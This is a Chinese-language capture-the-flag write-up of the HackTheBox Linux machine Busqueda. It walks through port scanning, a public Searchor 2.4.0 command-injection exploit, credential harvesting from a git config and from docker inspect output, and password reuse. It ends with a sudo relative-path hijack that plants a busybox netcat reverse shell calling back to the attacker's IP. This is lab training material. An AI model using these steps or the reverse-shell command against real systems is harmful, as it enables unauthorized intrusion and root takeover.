---
title: "Busqueda"
description: "这篇HackTheBox Linux 靶机 Busqueda 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
summary: "这篇HackTheBox Linux 靶机 Busqueda 复盘用一句话串起了信息收集、立足点获取与本地提权的完整路径。"
date: "2024-10-02T14:35:00+08:00"
publishDate: "2024-10-02T14:35:00+08:00"
lastmod: "2024-10-02T14:35:00+08:00"
url: "/hackthebox/linux/busqueda/"
image: "images/oscp-banners/banner-001.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "HackTheBox"
tags:
  - "Linux"
oscp_provider: "HackTheBox"
oscp_platform: "Linux"
---
<!-- oscp-refactor:meta-start -->
> 平台：Linux ｜ 来源：HackTheBox
<!-- oscp-refactor:meta-end -->

对目标服务器进行端口扫描

```
 sudo nmap -p- 10.10.11.208 -open
```

![image-20240907153520424](https://s2.loli.net/2024/09/07/xe52MlcS8yzv6iX.png)

对目标服务器开放端口进一步进行探测

```
sudo nmap -p22,80 -A 10.10.11.208 -oX busqueda.xml
```

![image-20240907153539748](https://files.seeusercontent.com/2026/04/06/tG2d/image-20240907153539748.png)

对应端口服务器没有可以直接利用的漏洞

优先访问80端口页面

收集信息

应用：Powered by Flask and Searchor 2.4.0

根据google搜索对应exp，找到以下的链接内容

https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

下载对应脚本，进行执行

成功反弹shell

![image-20240907155418617](https://s2.loli.net/2024/09/07/cHB9igqFNfERUSW.png)

到/home/svc 目录下找到user.txt，获取对应flag.txt

![image-20240907160138215](https://s2.loli.net/2024/09/07/2P1mWVRZXnQO68j.png)

在/var/www/app下发现.git，config内容如下

![image-20240907164044596](https://s2.loli.net/2024/09/07/sAGUVzMe92nDod1.png)

怀疑中间一串是密码

svc

jh1usoih2bkjaspwe92

验证发现确实如此，可以通过22端口登录目标主机

```
sudo -l

```

![image-20240907165228341](https://s2.loli.net/2024/09/07/5GletBpKsor7hyM.png)

发现以下内容，貌似能够运行docker命令，dockers-ps

![image-20240907165307485](https://s2.loli.net/2024/09/07/7kZvofxID9prc1N.png)

经过查询format的参数使用具有对应格式（https://docs.docker.com/engine/cli/formatting/）

使用json进行输出

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea
```

输出内容如下

```javascript
{"Id":"960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb","Created":"2023-01-06T17:26:54.457090149Z","Path":"/usr/bin/entrypoint","Args":["/bin/s6-svscan","/etc/s6"],"State":{"Status":"running","Running":true,"Paused":false,"Restarting":false,"OOMKilled":false,"Dead":false,"Pid":1825,"ExitCode":0,"Error":"","StartedAt":"2024-09-07T07:01:02.148492467Z","FinishedAt":"2023-04-04T17:03:01.71746837Z"},"Image":"sha256:6cd4959e1db11e85d89108b74db07e2a96bbb5c4eb3aa97580e65a8153ebcc78","ResolvConfPath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/resolv.conf","HostnamePath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/hostname","HostsPath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/hosts","LogPath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb-json.log","Name":"/gitea","RestartCount":0,"Driver":"overlay2","Platform":"linux","MountLabel":"","ProcessLabel":"","AppArmorProfile":"docker-default","ExecIDs":null,"HostConfig":{"Binds":["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro","/root/scripts/docker/gitea:/data:rw"],"ContainerIDFile":"","LogConfig":{"Type":"json-file","Config":{}},"NetworkMode":"docker_gitea","PortBindings":{"22/tcp":[{"HostIp":"127.0.0.1","HostPort":"222"}],"3000/tcp":[{"HostIp":"127.0.0.1","HostPort":"3000"}]},"RestartPolicy":{"Name":"always","MaximumRetryCount":0},"AutoRemove":false,"VolumeDriver":"","VolumesFrom":[],"CapAdd":null,"CapDrop":null,"CgroupnsMode":"private","Dns":[],"DnsOptions":[],"DnsSearch":[],"ExtraHosts":null,"GroupAdd":null,"IpcMode":"private","Cgroup":"","Links":null,"OomScoreAdj":0,"PidMode":"","Privileged":false,"PublishAllPorts":false,"ReadonlyRootfs":false,"SecurityOpt":null,"UTSMode":"","UsernsMode":"","ShmSize":67108864,"Runtime":"runc","ConsoleSize":[0,0],"Isolation":"","CpuShares":0,"Memory":0,"NanoCpus":0,"CgroupParent":"","BlkioWeight":0,"BlkioWeightDevice":null,"BlkioDeviceReadBps":null,"BlkioDeviceWriteBps":null,"BlkioDeviceReadIOps":null,"BlkioDeviceWriteIOps":null,"CpuPeriod":0,"CpuQuota":0,"CpuRealtimePeriod":0,"CpuRealtimeRuntime":0,"CpusetCpus":"","CpusetMems":"","Devices":null,"DeviceCgroupRules":null,"DeviceRequests":null,"KernelMemory":0,"KernelMemoryTCP":0,"MemoryReservation":0,"MemorySwap":0,"MemorySwappiness":null,"OomKillDisable":null,"PidsLimit":null,"Ulimits":null,"CpuCount":0,"CpuPercent":0,"IOMaximumIOps":0,"IOMaximumBandwidth":0,"MaskedPaths":["/proc/asound","/proc/acpi","/proc/kcore","/proc/keys","/proc/latency_stats","/proc/timer_list","/proc/timer_stats","/proc/sched_debug","/proc/scsi","/sys/firmware"],"ReadonlyPaths":["/proc/bus","/proc/fs","/proc/irq","/proc/sys","/proc/sysrq-trigger"]},"GraphDriver":{"Data":{"LowerDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34-init/diff:/var/lib/docker/overlay2/bd9193f562680204dc7c46c300e3410c51a1617811a43c97dffc9c3ee6b6b1b8/diff:/var/lib/docker/overlay2/df299917c1b8b211d36ab079a37a210326c9118be26566b07944ceb4342d3716/diff:/var/lib/docker/overlay2/50fb3b75789bf3c16c94f888a75df2691166dd9f503abeadabbc3aa808b84371/diff:/var/lib/docker/overlay2/3668660dd8ccd90774d7f567d0b63cef20cccebe11aaa21253da056a944aab22/diff:/var/lib/docker/overlay2/a5ca101c0f3a1900d4978769b9d791980a73175498cbdd47417ac4305dabb974/diff:/var/lib/docker/overlay2/aac5470669f77f5af7ad93c63b098785f70628cf8b47ac74db039aa3900a1905/diff:/var/lib/docker/overlay2/ef2d799b8fba566ee84a45a0070a1cf197cd9b6be58f38ee2bd7394bb7ca6560/diff:/var/lib/docker/overlay2/d45da5f3ac6633ab90762d7eeac53b0b83debef94e467aebed6171acca3dbc39/diff","MergedDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/merged","UpperDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/diff","WorkDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/work"},"Name":"overlay2"},"Mounts":[{"Type":"bind","Source":"/etc/localtime","Destination":"/etc/localtime","Mode":"ro","RW":false,"Propagation":"rprivate"},{"Type":"bind","Source":"/etc/timezone","Destination":"/etc/timezone","Mode":"ro","RW":false,"Propagation":"rprivate"},{"Type":"bind","Source":"/root/scripts/docker/gitea","Destination":"/data","Mode":"rw","RW":true,"Propagation":"rprivate"}],"Config":{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}},"NetworkSettings":{"Bridge":"","SandboxID":"713ae14117fa5a0ec58f2c9ebcf2ddceeb3463904b8408f261752cdbb122000f","HairpinMode":false,"LinkLocalIPv6Address":"","LinkLocalIPv6PrefixLen":0,"Ports":{"22/tcp":[{"HostIp":"127.0.0.1","HostPort":"222"}],"3000/tcp":[{"HostIp":"127.0.0.1","HostPort":"3000"}]},"SandboxKey":"/var/run/docker/netns/713ae14117fa","SecondaryIPAddresses":null,"SecondaryIPv6Addresses":null,"EndpointID":"","Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"IPAddress":"","IPPrefixLen":0,"IPv6Gateway":"","MacAddress":"","Networks":{"docker_gitea":{"IPAMConfig":null,"Links":null,"Aliases":["server","960873171e2e"],"NetworkID":"cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227","EndpointID":"da025c30e9c7b3a010fa7baa0ade9c96cbf2192edfb36df9084f819ac21bcece","Gateway":"172.19.0.1","IPAddress":"172.19.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:13:00:02","DriverOpts":null}}}}
```

以上内容为容器配置项目

查看后发现以下一行内容

GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh，应当为gitea的账号密码

```
user:gitea
password:yuiu1hoiu4i5ho1uh
```

根据之前在gitconfig中发现的子域名gitea.searcher.htb，进行域名爆破后发现登陆页面

![image-20240907170521099](https://s2.loli.net/2024/09/07/OHpsvM7dDCgyXUW.png)

![image-20240907170529922](https://s2.loli.net/2024/09/07/xMPvhp2z7Dq4Ffo.png)

直接使用上述的账号密码登录失败

![image-20240907171052199](https://s2.loli.net/2024/09/07/equR4ygcY8s2JND.png)

查看该页面，发现有两个用户，使用这两个用户名和密码进行组合进行尝试

结果发现administrator能成功登录

![image-20240907171203087](https://files.seeusercontent.com/2026/04/06/A1ko/image-20240907171203087.png)

查看你system-chechup.py，发现full-checkup的逻辑实际为一个bash脚本

![image-20240907171534421](https://files.seeusercontent.com/2026/04/06/xTf8/image-20240907171534421.png)

查找这个脚本

```
find / -iname "full-checkup.sh" 2>/dev/null
```

![image-20240907171629505](https://files.seeusercontent.com/2026/04/06/0xCy/image-20240907171629505.png)

但查看该脚本为root权限编辑。查看上述python代码，对应full-checkup.sh没有使用完整路径，故可以使用对应目录下的同名文件替换

```
cd /tmp
echo -e "#! /bin/bash\n busybox nc 10.10.16.10 12345 -e sh" > /tmp/full-checkup.sh
chmod +x full-checkup.sh
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

成功获取root权限

